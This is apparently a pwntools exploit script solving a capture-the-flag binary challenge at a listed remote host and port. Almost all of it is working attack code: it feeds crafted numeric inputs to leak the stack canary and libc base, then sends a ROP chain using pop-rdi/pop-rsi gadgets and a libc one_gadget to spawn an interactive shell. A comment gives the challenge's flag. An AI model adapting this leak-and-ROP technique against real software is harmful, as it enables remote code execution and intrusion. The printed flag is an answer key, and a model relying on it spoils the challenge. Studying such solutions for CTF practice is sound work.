#!/usr/bin/env python3
from pwn import *

context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', '-d', 'Debian', 'bash', '-c']
context.arch = 'amd64'
host = '45.122.249.68'
port = 20001
elf_name = './chall_patched'
elf = ELF(elf_name)
libc = ELF('./libc.so.6')
# b *0x0000000004012FC
script = '''
b *0x000000000401343
c
'''
# script += 'c\n'*17
if args.LOCAL:
    p = process(elf_name)
elif args.GDB:
    p = process(elf_name)
    gdb.attach(p, gdbscript=script)
else:
    p = remote(host, port)

ret = 0x000000000040101a

p.sendlineafter(b': ', b'21')
for i in range(17):
    p.sendlineafter(b': ', b'0')
p.sendlineafter(b': ', b'-')
p.sendlineafter(b': ', b'-')
p.sendlineafter(b': ', str(ret).encode()) 
p.sendlineafter(b': ', str(elf.sym.main).encode()) 
canary_rbp = int(p.recvline(), 10) - elf.sym.main - ret
log.info("canary+rbp " + hex(canary_rbp))

p.sendlineafter(b': ', str(21 + 17).encode())
for i in range(17):
    p.sendlineafter(b': ', b'0')
p.sendlineafter(b': ', b'-')
p.sendlineafter(b': ', b'-')
p.sendlineafter(b': ', str(ret).encode()) 
p.sendlineafter(b': ', str(elf.sym.main).encode()) 
for i in range(16):
    p.sendlineafter(b': ', b'0')
p.sendlineafter(b': ', b'-')
libc_base = int(p.recvline(), 10) - elf.sym.main - canary_rbp - ret - 0x29e40
log.info("libc_base " + hex(libc_base))

# onegadget here
one_gadget = 0xebcf8 + libc_base
rdi = 0x00000000004013d3
rsi_r15 = 0x00000000004013d1
p.sendlineafter(b': ', str(25).encode())
for i in range(17):
    p.sendlineafter(b': ', b'0')
p.sendlineafter(b': ', b'-')
p.sendlineafter(b': ', str(elf.bss() + 0x400).encode())
p.sendlineafter(b': ', str(rdi).encode()) 
p.sendlineafter(b': ', str(0).encode()) 
p.sendlineafter(b': ', str(rsi_r15).encode()) 
p.sendlineafter(b': ', str(0).encode()) 
p.sendlineafter(b': ', str(0).encode()) 
p.sendlineafter(b': ', str(one_gadget).encode()) 
# W1{just_a_simple_bof_to_warm_yourself_up}

p.interactive()
